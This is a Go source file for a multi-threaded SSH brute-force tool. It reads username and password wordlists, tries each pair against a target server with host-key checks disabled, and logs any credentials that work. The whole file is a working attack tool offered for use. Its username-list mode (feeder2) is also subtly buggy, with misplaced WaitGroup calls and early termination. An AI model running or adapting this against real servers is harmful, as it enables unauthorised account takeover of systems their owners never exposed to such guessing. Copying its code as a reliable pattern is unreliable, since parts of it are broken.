package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	ip           = flag.String("ip", "", "IP of the SSH server")
	port         = flag.String("port", "22", "Port of the SSH server")
	count        = flag.Int("T", 5, "Amount of worker working concurrently")
	passwordFile = flag.String("P", "", "File with passwords")
	user         = flag.String("u", "", "SSH user to bruteforce")
	usernameFile = flag.String("U", "", "File with usernames")
	timeout      = flag.Int("timeout", 5, "Timeout per connection in seconds")
	wg           sync.WaitGroup
)

const (
	authFailError = "ssh: handshake failed: ssh: unable to authenticate"
)

type input struct {
	user     string
	password string
	done     bool
}

// isUp checks if given server is up
func isUp() bool {
	conn, err := net.Dial("tcp", *ip+":"+*port)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// worker tries the given user,pw combo and logs to stdout if successful
func worker(ctx context.Context, inputChannel chan input, cancel context.CancelFunc) {
	defer wg.Done()
	for {
		select {
		case i := <-inputChannel:
			if i.done {
				cancel()
				return
			}

			// check if worker should finish here
			select {
			case <-ctx.Done():
				return
			default:
				//pass
			}

			config := &ssh.ClientConfig{ // TODO: play with settings (e.g. User and Banner stuff...)
				User: i.user,
				Auth: []ssh.AuthMethod{
					ssh.Password(i.password),
				},
				Timeout:         time.Duration(*timeout) * time.Second,
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			}
			config.SetDefaults()

			// just sleep a little bit
			time.Sleep(time.Duration(rand.Intn(200)+1) * time.Millisecond)

			_, err := ssh.Dial("tcp", *ip+":"+*port, config)
			if err != nil {
				if !strings.Contains(err.Error(), authFailError) { // check if auth-failed-err or not
					// if not an auth-failed-err --> server is down?
					log.Printf("Error @ Dial(): %s\n", err)
					cancel() // kill the other workers
					return
				}
				log.Printf("[FAILED] %s:%s\n", i.user, i.password)
			} else {
				log.Printf("[SUCCESS] Got creds: %s:%s\n", i.user, i.password)
				cancel()
				return
			}
		case <-ctx.Done():
			return
		}
	}
}
// feeder feeds the lines(=passwords) from the given input file to the worker
func feeder(ctx context.Context, username string, inputChannel chan input) {
	f, err := os.Open(*passwordFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			if scanner.Scan() {
				line := scanner.Text()
				inputChannel <- input{user: username, password: line, done: false} // TODO: this may be a race condition
			} else {
				// no more lines in file
				inputChannel <- input{user: "", password: "", done: true}
				return
			}
		}
	}
}
// feeder feeds the lines(=passwords) from the given input file to the worker
func feeder2(ctx context.Context, username string, inputChannel chan input) {
	f, err := os.Open(*passwordFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			if scanner.Scan() {
				line := scanner.Text()
				f, err := os.Open(username)
				if err != nil {
					fmt.Println(err)
					return
				}
				defer f.Close()

				users := bufio.NewScanner(f)
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if users.Scan() {
							user := users.Text()
							inputChannel <- input{user: user, password: line, done: false} // TODO: this may be a race condition
						} else {
							// no more lines in file
							inputChannel <- input{user: "", password: "", done: true}
							return
						}
					}
				}
			} else {
				// no more lines in file
				inputChannel <- input{user: "", password: "", done: true}
				return
			}
		}
	}
}

func main() {
	fmt.Println("CAUTION: |worker-count| <= |passwords|")

	rand.Seed(time.Now().UnixNano())
	flag.Parse()
	if *ip == "" || *passwordFile == "" || (*user == "" && *usernameFile == "" ) {
		flag.PrintDefaults()
		os.Exit(1)
	}

	if !isUp() {
		fmt.Println("Host seems to be down...")
		os.Exit(1)
	}

	inputChannel := make(chan input, 10)
	ctx, cancel := context.WithCancel(context.Background())

	for i := 0; i < *count; i++ {
		wg.Add(1)
		go worker(ctx, inputChannel, cancel)
	}

	// check if file exists
	f, err := os.Open(*passwordFile)
	if err != nil {
		fmt.Println(err)
		cancel()
		wg.Wait()
		return
	}
	f.Close()

	wg.Add(1)
	if *user != "" && *usernameFile == "" {
		go feeder(ctx, *user, inputChannel)
	} else if *user == "" && *usernameFile != "" {
		go feeder2(ctx, *usernameFile, inputChannel)
	}

	wg.Wait()

	log.Println("[DONE]")

}
